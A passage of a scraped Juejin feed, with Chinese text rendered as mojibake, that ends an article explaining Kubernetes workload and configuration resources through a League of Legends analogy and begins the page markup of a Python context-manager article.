<li>éœ€æ­é… â€‹<strong>â€‹Headless Serviceâ€‹</strong>â€‹ï¼ˆ<code>ClusterIP: None</code>ï¼‰å®ç° DNS è§£æã€‚</li>
<li>PV å›æ”¶ç­–ç•¥å»ºè®®è®¾ä¸º <code>Retain</code> é˜²æ­¢è¯¯åˆ æ•°æ®ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-7">ğŸ“¡ â€‹<strong>â€‹DaemonSetâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šç¡®ä¿æ¯ä¸ªèŠ‚ç‚¹ï¼ˆæˆ–æŒ‡å®šèŠ‚ç‚¹ï¼‰è¿è¡Œä¸€ä¸ª Pod å‰¯æœ¬ï¼Œç”¨äºèŠ‚ç‚¹çº§å®ˆæŠ¤è¿›ç¨‹ã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç‰¹æ€§â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹èŠ‚ç‚¹å…¨è¦†ç›–â€‹</strong>â€‹ï¼šæ–°èŠ‚ç‚¹åŠ å…¥æ—¶è‡ªåŠ¨åˆ›å»º Podï¼ŒèŠ‚ç‚¹ç§»é™¤æ—¶è‡ªåŠ¨åˆ é™¤ã€‚</li>
<li>â€‹<strong>â€‹çµæ´»è°ƒåº¦â€‹</strong>â€‹ï¼šé€šè¿‡ <code>nodeSelector</code> æˆ–æ±¡ç‚¹å®¹å¿ï¼ˆTolerationsï¼‰æ§åˆ¶éƒ¨ç½²èŒƒå›´ã€‚</li>
<li>â€‹<strong>â€‹èµ„æºä¼˜åŒ–â€‹</strong>â€‹ï¼šæ”¯æŒèµ„æºè¯·æ±‚/é™åˆ¶é…ç½®ï¼Œé¿å…å ç”¨è¿‡å¤šèŠ‚ç‚¹èµ„æºã€‚<br/>
â€‹<strong>â€‹é€‚ç”¨åœºæ™¯â€‹</strong>â€‹ï¼š</li>
<li>æ—¥å¿—æ”¶é›†ï¼ˆFluentdã€Logstashï¼‰ã€ç›‘æ§ä»£ç†ï¼ˆPrometheus Node Exporterï¼‰ã€‚</li>
<li>ç½‘ç»œæ’ä»¶ï¼ˆCalicoã€Flannelï¼‰ã€å®‰å…¨æ‰«æå·¥å…·ï¼ˆClairï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-8">âš¡ â€‹<strong>â€‹Jobâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šç®¡ç†ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œç¡®ä¿æŒ‡å®šæ•°é‡çš„ Pod æˆåŠŸè¿è¡Œåç»ˆæ­¢ã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç‰¹æ€§â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹ä»»åŠ¡å®¹é”™â€‹</strong>â€‹ï¼šæ”¯æŒå¤±è´¥é‡è¯•ï¼ˆ<code>backoffLimit</code> æ§åˆ¶é‡è¯•æ¬¡æ•°ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹å¹¶è¡Œæ§åˆ¶â€‹</strong>â€‹ï¼šé€šè¿‡ <code>parallelism</code> è®¾ç½®å¹¶å‘ Pod æ•°ã€‚<br/>
â€‹<strong>â€‹é€‚ç”¨åœºæ™¯â€‹</strong>â€‹ï¼š</li>
<li>æ‰¹å¤„ç†ä½œä¸šï¼ˆå¦‚æ•°æ®è¿ç§»ï¼‰ã€AI è®­ç»ƒä»»åŠ¡ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-9">â±ï¸ â€‹<strong>â€‹CronJobâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šåŸºäºæ—¶é—´è°ƒåº¦çš„ Job æ§åˆ¶å™¨ï¼Œæ‰§è¡Œå‘¨æœŸæ€§ä»»åŠ¡ã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç‰¹æ€§â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹Cron è¡¨è¾¾å¼â€‹</strong>â€‹ï¼šçµæ´»å®šä¹‰ä»»åŠ¡æ‰§è¡Œæ—¶é—´ï¼ˆå¦‚ <code>0 * * * *</code> æ¯å°æ—¶ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹ä»»åŠ¡ç»§æ‰¿â€‹</strong>â€‹ï¼šç»§æ‰¿ Job çš„æ‰€æœ‰ç‰¹æ€§ï¼ˆå¦‚é‡è¯•ã€å¹¶è¡Œæ§åˆ¶ï¼‰ã€‚<br/>
â€‹<strong>â€‹é€‚ç”¨åœºæ™¯â€‹</strong>â€‹ï¼š</li>
<li>å®šæ—¶å¤‡ä»½ã€å‘¨æœŸæŠ¥è¡¨ç”Ÿæˆã€èµ„æºæ¸…ç†ä»»åŠ¡ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-10">ğŸ’ â€‹<strong>â€‹å·¥ä½œè´Ÿè½½èµ„æºå¯¹æ¯”è¡¨â€‹</strong>â€‹</h4>









































<table><thead><tr><th align="left">â€‹<strong>â€‹èµ„æºç±»å‹â€‹</strong>â€‹</th><th align="left">â€‹<strong>â€‹æ ¸å¿ƒä½œç”¨â€‹</strong>â€‹</th><th align="left">â€‹<strong>â€‹å…³é”®ç‰¹æ€§â€‹</strong>â€‹</th><th align="left">â€‹<strong>â€‹å…¸å‹åœºæ™¯â€‹</strong>â€‹</th></tr></thead><tbody><tr><td align="left">â€‹<strong>â€‹Deploymentâ€‹</strong>â€‹</td><td align="left">æ— çŠ¶æ€åº”ç”¨ç®¡ç†</td><td align="left">æ»šåŠ¨æ›´æ–°ã€è‡ªåŠ¨æ‰©ç¼©å®¹ã€ç‰ˆæœ¬å›æ»š</td><td align="left">Web æœåŠ¡ã€API ç½‘å…³</td></tr><tr><td align="left">â€‹<strong>â€‹StatefulSetâ€‹</strong>â€‹</td><td align="left">æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†</td><td align="left">ç¨³å®šç½‘ç»œæ ‡è¯†ã€æŒä¹…åŒ–å­˜å‚¨ã€æœ‰åºæ“ä½œ</td><td align="left">æ•°æ®åº“é›†ç¾¤ã€æ¶ˆæ¯é˜Ÿåˆ—</td></tr><tr><td align="left">â€‹<strong>â€‹DaemonSetâ€‹</strong>â€‹</td><td align="left">èŠ‚ç‚¹çº§å®ˆæŠ¤è¿›ç¨‹</td><td align="left">å…¨è¦†ç›–èŠ‚ç‚¹ã€æ±¡ç‚¹å®¹å¿ã€è‡ªåŠ¨æ‰©ç¼©</td><td align="left">æ—¥å¿—æ”¶é›†ã€ç½‘ç»œæ’ä»¶</td></tr><tr><td align="left">â€‹<strong>â€‹Jobâ€‹</strong>â€‹</td><td align="left">ä¸€æ¬¡æ€§ä»»åŠ¡</td><td align="left">å¤±è´¥é‡è¯•ã€å¹¶è¡Œæ§åˆ¶</td><td align="left">æ‰¹å¤„ç†è®¡ç®—ã€æ•°æ®è¿ç§»</td></tr><tr><td align="left">â€‹<strong>â€‹CronJobâ€‹</strong>â€‹</td><td align="left">å‘¨æœŸæ€§ä»»åŠ¡</td><td align="left">æ—¶é—´è°ƒåº¦ã€ç»§æ‰¿ Job ç‰¹æ€§</td><td align="left">å®šæ—¶å¤‡ä»½ã€èµ„æºæ¸…ç†</td></tr></tbody></table>
<blockquote>
<p>âœ… â€‹<strong>â€‹æ€»ç»“â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹æ— çŠ¶æ€æœåŠ¡â€‹</strong>â€‹é¦–é€‰ <code>Deployment</code>ï¼Œâ€‹<strong>â€‹æœ‰çŠ¶æ€æœåŠ¡â€‹</strong>â€‹å¿…ç”¨ <code>StatefulSet</code> + <code>PVC</code>ã€‚</li>
<li>â€‹<strong>â€‹èŠ‚ç‚¹çº§ä»»åŠ¡â€‹</strong>â€‹ï¼ˆå¦‚ç›‘æ§ï¼‰ç”¨ <code>DaemonSet</code>ï¼Œâ€‹<strong>â€‹æ‰¹å¤„ç†/å®šæ—¶ä»»åŠ¡â€‹</strong>â€‹ç”¨ <code>Job</code>/<code>CronJob</code>ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒéœ€ç»“åˆèµ„æºè¯·æ±‚/é™åˆ¶ï¼ˆ<code>resources.requests/limits</code>ï¼‰é¿å…èµ„æºäº‰æŠ¢ã€‚</li>
</ul>
</blockquote>
<h2 data-id="heading-11">LOLçš„è£…å¤‡ - K8sçš„èµ„æºé…ç½®</h2>
<p>åœ¨LOLä¸­ï¼Œé€‰å¥½äº†è‹±é›„ï¼Œç¡®å®šå¥½äº†å®šä½ï¼Œè¿˜éœ€è¦åœ¨å®é™…åº”ç”¨ä¸­å‡ºä¸åŒçš„è£…å¤‡æ‰èƒ½å‘æŒ¥è¿™ä¸ªè‹±é›„åœ¨è¿™ä¸ªå®šä½ä¸­çš„æœ€å¤§å¨åŠ›ã€‚ä¾‹å¦‚å°„æ‰‹éœ€è¦â€œæœ€åçš„è½»è¯­â€æ¥å®ç°å¤„ç†å‰æ’çš„èƒ½åŠ›ï¼Œå¦å…‹éœ€è¦å…°é¡¿ä¹‹å…†æ¥å®ç°æŠµæŠ—æš´å‡»çš„èƒ½åŠ›ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e21c84683a84dbb87746c71e016d5a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhpc0lzQ2xhcms=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604154&amp;x-signature=17%2F21pVJbrBB5J93lIuEn9Z9QNk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>åœ¨K8sä¸­ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘ä»¬æœ‰äº†åº”ç”¨ï¼Œä¹Ÿé…ç½®äº†å·¥ä½œè´Ÿè½½ï¼Œè¿˜éœ€è¦å…¶å®ƒçš„ä¸€äº›èµ„æºé…ç½®æ¥å‘æŒ¥åº”ç”¨çœŸæ­£çš„å®åŠ›ã€‚ä¾‹å¦‚æˆ‘ä»¬æœ‰ä¸ªåœ¨çº¿ç¬”è®°çš„åº”ç”¨ï¼Œæˆ‘ä»¬ç»™ä»–é…ç½®å¥½äº†StatefulSetåï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥ç»™å®ƒé…ç½®pvcè®©å®ƒå®ç°æŒä¹…åŒ–ç¬”è®°çš„èƒ½åŠ›ï¼›è¿˜éœ€è¦è¿›ä¸€æ­¥ç»™å®ƒé…ç½®serviceæ¥å®ç°å¯¹é›†ç¾¤å¤–æš´éœ²æ¥å£çš„èƒ½åŠ›ã€‚é‚£ä¹ˆå¸¸è§çš„é…ç½®æœ‰å“ªäº›å‘¢ï¼Ÿ</p>
<h4 data-id="heading-12">ğŸ”¹ â€‹<strong>â€‹Serviceâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šä¸ºPodæä¾›â€‹<strong>â€‹ç¨³å®šè®¿é—®å…¥å£â€‹</strong>â€‹ï¼Œå®ç°æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡ã€‚<br/>
â€‹<strong>â€‹ç±»å‹ä¸åœºæ™¯â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹ClusterIPâ€‹</strong>â€‹ï¼šé›†ç¾¤å†…éƒ¨æœåŠ¡é€šä¿¡ï¼ˆé»˜è®¤ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹NodePortâ€‹</strong>â€‹ï¼šé€šè¿‡èŠ‚ç‚¹IP+ç«¯å£æš´éœ²æœåŠ¡ï¼ˆä¸´æ—¶æµ‹è¯•ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹LoadBalancerâ€‹</strong>â€‹ï¼šäº‘ç¯å¢ƒç”Ÿäº§çº§å¤–éƒ¨è®¿é—®ï¼ˆè‡ªåŠ¨åˆ›å»ºäº‘LBï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-13">ğŸ”¹ â€‹<strong>â€‹ConfigMapâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šå­˜å‚¨â€‹<strong>â€‹éæ•æ„Ÿé…ç½®â€‹</strong>â€‹ï¼ˆç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ï¼‰ï¼Œè§£è€¦åº”ç”¨ä¸é…ç½®ã€‚<br/>
â€‹<strong>â€‹åœºæ™¯â€‹</strong>â€‹ï¼š</p>
<ul>
<li>æ³¨å…¥ç¯å¢ƒå˜é‡ï¼ˆå¦‚è°ƒè¯•å¼€å…³ï¼‰ã€‚</li>
<li>æŒ‚è½½é…ç½®æ–‡ä»¶ï¼ˆå¦‚Nginxé…ç½®ï¼‰ã€‚</li>
<li>æ”¯æŒçƒ­æ›´æ–°ï¼ˆVolumeæŒ‚è½½æ—¶è‡ªåŠ¨åŒæ­¥ï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-14">ğŸ”¹ â€‹<strong>â€‹Secretâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šç®¡ç†â€‹<strong>â€‹æ•æ„Ÿæ•°æ®â€‹</strong>â€‹ï¼ˆå¯†ç ã€TLSè¯ä¹¦ï¼‰ï¼ŒBase64ç¼–ç å­˜å‚¨ã€‚<br/>
â€‹<strong>â€‹ç±»å‹ä¸åœºæ™¯â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹Opaqueâ€‹</strong>â€‹ï¼šè‡ªå®šä¹‰æ•æ„Ÿæ•°æ®ï¼ˆå¦‚æ•°æ®åº“å¯†ç ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹kubernetes.io/tlsâ€‹</strong>â€‹ï¼šHTTPSè¯ä¹¦ï¼ˆç”¨äºIngressï¼‰ã€‚</li>
<li>â€‹<strong>â€‹dockerconfigjsonâ€‹</strong>â€‹ï¼šç§æœ‰é•œåƒä»“åº“è®¤è¯ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-15">ğŸ”¹ â€‹<strong>â€‹Ingressâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šç®¡ç†â€‹<strong>â€‹å¤–éƒ¨HTTP/Sæµé‡è·¯ç”±â€‹</strong>â€‹ï¼Œæ”¯æŒåŸŸå/è·¯å¾„è§„åˆ™ä¸SSLç»ˆæ­¢ã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç»„ä»¶â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹Ingressæ§åˆ¶å™¨â€‹</strong>â€‹ï¼ˆå¦‚Nginxã€Traefikï¼‰å¤„ç†æµé‡ã€‚</li>
<li>â€‹<strong>â€‹è§„åˆ™â€‹</strong>â€‹ï¼šæŒ‰åŸŸå/è·¯å¾„è½¬å‘åˆ°ä¸åŒServiceï¼ˆå¦‚<code>/api</code>â†’åç«¯æœåŠ¡ï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-16">ğŸ”¹ â€‹<strong>â€‹PVC (PersistentVolumeClaim)â€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šå£°æ˜â€‹<strong>â€‹æŒä¹…åŒ–å­˜å‚¨éœ€æ±‚â€‹</strong>â€‹ï¼ŒæŠ½è±¡åº•å±‚å­˜å‚¨ç»†èŠ‚ã€‚<br/>
â€‹<strong>â€‹åœºæ™¯â€‹</strong>â€‹ï¼š</p>
<ul>
<li>æ•°æ®åº“æŒä¹…åŒ–ï¼ˆå¦‚MySQLæ•°æ®å·ï¼‰ã€‚</li>
<li>å…±äº«å­˜å‚¨ï¼ˆNFSå¤šPodè¯»å†™ï¼‰ã€‚</li>
<li>åŠ¨æ€ä¾›ç»™ï¼šé€šè¿‡<code>StorageClass</code>è‡ªåŠ¨åˆ›å»ºPVã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-17">ğŸ’ â€‹<strong>â€‹æ ¸å¿ƒå¯¹æ¯”â€‹</strong>â€‹</h4>



































<table><thead><tr><th align="left">é…ç½®å¯¹è±¡</th><th align="left">æ ¸å¿ƒä½œç”¨</th><th align="left">å…¸å‹åœºæ™¯</th></tr></thead><tbody><tr><td align="left">Service</td><td align="left">æœåŠ¡å‘ç°+è´Ÿè½½å‡è¡¡</td><td align="left">å¾®æœåŠ¡é€šä¿¡ã€å¤–éƒ¨æµé‡æ¥å…¥</td></tr><tr><td align="left">ConfigMap</td><td align="left">éæ•æ„Ÿé…ç½®ç®¡ç†</td><td align="left">åº”ç”¨å‚æ•°ã€ç¯å¢ƒå˜é‡æ³¨å…¥</td></tr><tr><td align="left">Secret</td><td align="left">æ•æ„Ÿæ•°æ®å­˜å‚¨</td><td align="left">å¯†ç ã€TLSè¯ä¹¦ã€APIå¯†é’¥</td></tr><tr><td align="left">Ingress</td><td align="left">HTTP/Sæµé‡è·¯ç”±</td><td align="left">å¤šåŸŸåç®¡ç†ã€HTTPSå¸è½½</td></tr><tr><td align="left">PVC</td><td align="left">æŒä¹…åŒ–å­˜å‚¨å£°æ˜</td><td align="left">æ•°æ®åº“å­˜å‚¨ã€æ—¥å¿—æŒä¹…åŒ–</td></tr></tbody></table>
<blockquote>
<p>âœ… â€‹<strong>â€‹ä¸€å¥è¯æ€»ç»“â€‹</strong>â€‹ï¼š</p>
<ul>
<li>ç½‘ç»œè®¿é—®ç”¨ â€‹<strong>â€‹Service/Ingressâ€‹</strong>â€‹ï¼Œé…ç½®åˆ†ç¦»ç”¨ â€‹<strong>â€‹ConfigMap/Secretâ€‹</strong>â€‹ï¼Œæ•°æ®æŒä¹…ç”¨ â€‹<strong>â€‹PVCâ€‹</strong>â€‹ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒä¼˜å…ˆç»„åˆï¼š<code>LoadBalancer + Ingress + TLS Secret + PVC</code>ã€‚</li>
</ul>
</blockquote>
<h2 data-id="heading-18">ç»“è¯­</h2>
<p>LOLå’ŒK8séƒ½ä¸Šæ‰‹ä¹‹åï¼Œå…¶å®æˆ‘è§‰å¾—ç›¸æ¯”è¾ƒèµ·æ¥ï¼ŒLOLçš„ä¸Šæ‰‹éš¾åº¦è¦é«˜å¤šäº†ï¼Œè¿™ä¹ˆå¤šä¸ªè‹±é›„ï¼Œæ¯ä¸ªè‹±é›„æœ‰ä¸åŒçš„æœºåˆ¶å’ŒæŠ€èƒ½ï¼Œè¿™äº›å¯æ¯”K8sçš„å†…å®¹å¤šå¤šäº†ï¼Œæ‰€ä»¥å¦‚æœå¤§å®¶LOLéƒ½èƒ½ä¸Šæ‰‹çš„è¯ï¼Œä¸Šæ‰‹K8sè‚¯å®šä¸ä¼šæ˜¯é—®é¢˜çš„ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python è¿›é˜¶çŸ¥è¯†ç‚¹ç²¾è®²ï¼šä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆContext Managerï¼‰çš„åŸç†ä¸å®æˆ˜]]></title>    <link>https://juejin.cn/post/7589126217234382854</link>    <guid>https://juejin.cn/post/7589126217234382854</guid>    <pubDate>2025-12-29T07:37:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217234382854" data-draft-id="7588704463621259283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python è¿›é˜¶çŸ¥è¯†ç‚¹ç²¾è®²ï¼šä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆContext Managerï¼‰çš„åŸç†ä¸å®æˆ˜"/> <meta itemprop="keywords" content="Python,PyCharm"/> <meta itemprop="datePublished" content="2025-12-29T07:37:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python è¿›é˜¶çŸ¥è¯†ç‚¹ç²¾è®²ï¼šä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆContext Managerï¼‰çš„åŸç†ä¸å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:37:42.000Z" title="Mon Dec 29 2025 07:37:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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